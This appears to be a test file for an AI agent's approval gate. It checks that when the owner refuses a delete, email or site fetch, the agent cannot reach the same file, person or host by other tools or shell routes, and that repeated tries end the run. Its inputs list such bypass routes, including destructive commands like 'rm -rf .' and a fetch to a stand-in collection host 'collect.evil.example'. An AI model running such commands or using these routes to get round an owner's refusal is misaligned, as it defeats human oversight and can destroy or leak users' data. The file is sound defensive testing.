/**
 * S2-07: a "no" covers the thing, not just the tool, for the rest of the run. If the owner
 * refuses a delete, the bot cannot reach the same file by overwriting it, appending to it,
 * moving it, copying it or going through the shell, and the same goes for an address.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { ApprovalBroker, type Decision } from "../src/agent/approval-broker";
import { gateToolCall, type GateResult } from "../src/agent/tool-gate";
import { findDenial, recordDenial } from "../src/policy/denials";
import type { RunContext } from "../src/policy/types";
import { policyRig, type PolicyRig } from "./policy-fixture";

let rig: PolicyRig;
let answers: Array<Decision | "expire">;
let cards: number;
beforeEach(() => { rig = policyRig(); answers = []; cards = 0; });
afterEach(() => rig.close());

/** Ask for a call as a turn would: the owner's answers come from `answers`, in order. */
async function ask(run: RunContext, tool: string, args: Record<string, unknown>): Promise<GateResult> {
  const broker = new ApprovalBroker({
    db: rig.db, emit: () => { cards += 1; },
    waitForDecision: async (requestID, signal) => {
      const next = answers.shift();
      if (next === "expire" || next === undefined) {
        // Nobody answers: the wait ends when its time is up.
        await new Promise<void>((resolve) => { if (signal.aborted) resolve(); else signal.addEventListener("abort", () => resolve(), { once: true }); });
        return null;
      }
      rig.db.run("UPDATE approvals SET status='decided', decision=?, decided_at=? WHERE id=?", [next, new Date().toISOString(), requestID]);
      return next;
    },
  });
  return gateToolCall(
    { db: rig.db, broker, emit: () => undefined, setState: () => undefined, hold: () => () => undefined, ownerWaitMs: 50 },
    run, { tool, args, callID: `call_${Math.random().toString(36).slice(2)}` }, new AbortController().signal,
  );
}

const refused = (result: GateResult): boolean => !result.go && result.code === "denied_resource";

describe("a denied delete covers the file by every other route", () => {
  beforeEach(() => writeFileSync(join(rig.scratch, "report.txt"), "the report"));

  test("the owner says no to the delete: it does not run", async () => {
    answers.push("reject");
    const result = await ask(rig.run, "bash", { command: "rm report.txt" });
    expect(result.go).toBe(false);
    if (!result.go) expect(result.code).toBe("approval_rejected");
    expect(cards).toBe(1);
  });

  test("then overwrite, append, move, copy and shell are refused, with no card and not run", async () => {
    const tries: Array<[string, Record<string, unknown>]> = [
      ["write_file", { path: "report.txt", content: "new" }],
      ["write_file", { path: "report.txt", content: "more", append: true }],
      ["write_file", { path: join(rig.scratch, "REPORT.TXT"), content: "again" }],
      ["bash", { command: "mv report.txt elsewhere.txt" }],
      ["bash", { command: "cp report.txt copy.txt" }],
      ["bash", { command: "echo gone > report.txt" }],
      ["bash", { command: "rm -f ./report.txt" }],
      ["bash", { command: "rm *.txt" }],
      ["bash", { command: "rm -rf ." }],
    ];
    let route = 0;
    for (const [tool, args] of tries) {
      // Each route gets its own run (three tries at one thing in one run end that run, which is its own test below).
      route += 1;
      const run = rig.another({ turnID: `trn_route_${route}`, rootTurnID: `trn_route_${route}` });
      answers.push("reject");
      await ask(run, "bash", { command: "rm report.txt" });
      const result = await ask(run, tool, args);
      expect({ tool, args, refused: refused(result) }).toEqual({ tool, args, refused: true });
    }
    // The only cards were the nine asks about the delete: every other route was answered before it asked.
    expect(cards).toBe(tries.length);
  });

  test("the refusal tells the model it covers every route and what to do instead", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const result = await ask(rig.run, "write_file", { path: "report.txt", content: "x" });
    expect(result.go).toBe(false);
    if (!result.go) {
      const { error } = JSON.parse(result.content) as { error: string };
      expect(error).toContain("the owner said no to deleting");
      expect(error).toContain("report.txt");
      expect(error).toContain("every tool and every route");
      expect(error).toContain("Tell the owner what you were trying to do");
    }
  });

  test("reading the file is still allowed: a no to deleting is not a no to reading", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    expect((await ask(rig.run, "read_file", { path: "report.txt" })).go).toBe(true);
    expect((await ask(rig.run, "bash", { command: "cat report.txt" })).go).toBe(true);
  });

  test("another file is not covered", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    answers.push("once");
    const result = await ask(rig.run, "write_file", { path: "notes.md", content: "x" });
    expect(result.go).toBe(true);
  });

  test("a card nobody answered is a no as well", async () => {
    answers.push("expire");
    const first = await ask(rig.run, "bash", { command: "rm report.txt" });
    expect(!first.go && first.code).toBe("approval_expired");
    expect(refused(await ask(rig.run, "write_file", { path: "report.txt", content: "x" }))).toBe(true);
  });

  test("the next run starts clean: the no lasts for the run, not for ever", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const later = rig.another({ turnID: "trn_next" });
    answers.push("once");
    expect((await ask(later, "write_file", { path: "report.txt", content: "x" })).go).toBe(true);
  });

  test("a bot the run hands work to is covered too, because it shares the run", async () => {
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const child = rig.another({ turnID: "trn_child", rootTurnID: rig.run.rootTurnID, bot: "researcher" });
    expect(refused(await ask(child, "write_file", { path: "report.txt", content: "x" }))).toBe(true);
  });
});

describe("a denied address covers it across tools", () => {
  test("no to a mail covers a calendar invite to the same person, and not another person", async () => {
    answers.push("reject");
    await ask(rig.run, "mail_send", { account: "owner", to: ["ann@example.com"], subject: "s", body: "b" });
    expect(refused(await ask(rig.run, "calendar_create", { account: "agent", summary: "x", start: "2026-11-20T09:00:00Z", end: "2026-11-20T10:00:00Z", attendees: ["Ann@Example.com"] }))).toBe(true);
    expect(refused(await ask(rig.run, "mail_send", { account: "agent", to: ["ann@example.com"], subject: "s", body: "b" }))).toBe(true);
    expect(refused(await ask(rig.run, "mail_send", { account: "agent", to: ["bob@example.com"], subject: "s", body: "b" }))).toBe(false);
  });

  test("no to opening a site covers fetching it another way", async () => {
    const tainted = rig.another({ taint: [{ kind: "web", label: "x", at: "2026-11-16T10:00:00Z" }] });
    answers.push("reject");
    await ask(tainted, "web_fetch", { url: "https://collect.evil.example/a?d=1" });
    expect(refused(await ask(tainted, "web_fetch", { url: "https://collect.evil.example/b" }))).toBe(true);
    expect(refused(await ask(tainted, "link_save", { url: "https://collect.evil.example/c" }))).toBe(true);
  });
});

describe("a bot that keeps trying is stopped", () => {
  test("the third try at something the owner refused ends the run", async () => {
    writeFileSync(join(rig.scratch, "report.txt"), "the report");
    answers.push("reject");
    await ask(rig.run, "bash", { command: "rm report.txt" });
    const tries = [];
    for (let i = 0; i < 3; i += 1) tries.push(await ask(rig.run, "write_file", { path: "report.txt", content: `try ${i}` }));
    expect(tries.map((result) => (result.go ? "go" : result.stop ? "stop" : result.code))).toEqual(["denied_resource", "denied_resource", "stop"]);
    const last = tries[2]!;
    if (!last.go) expect(last.stop?.cause).toBe("refused");
  });
});

describe("the record itself", () => {
  test("a denial is found by the run's root and the resource, for the operations that hurt", () => {
    recordDenial(rig.db, rig.run, { tool: "bash", operation: "delete", cause: "denied", resources: [{ kind: "path", value: "/x/a.txt" }] });
    expect(findDenial(rig.db, rig.run, "change", [{ kind: "path", value: "/x/a.txt" }])?.operation).toBe("delete");
    expect(findDenial(rig.db, rig.run, "read", [{ kind: "path", value: "/x/a.txt" }])).toBeNull();
    expect(findDenial(rig.db, rig.run, "change", [{ kind: "path", value: "/x/other.txt" }])).toBeNull();
    // A command on the folder reaches the file inside it.
    expect(findDenial(rig.db, rig.run, "delete", [{ kind: "path", value: "/x" }])).not.toBeNull();
    expect(findDenial(rig.db, rig.another({ turnID: "other", rootTurnID: "other" }), "change", [{ kind: "path", value: "/x/a.txt" }])).toBeNull();
  });
});
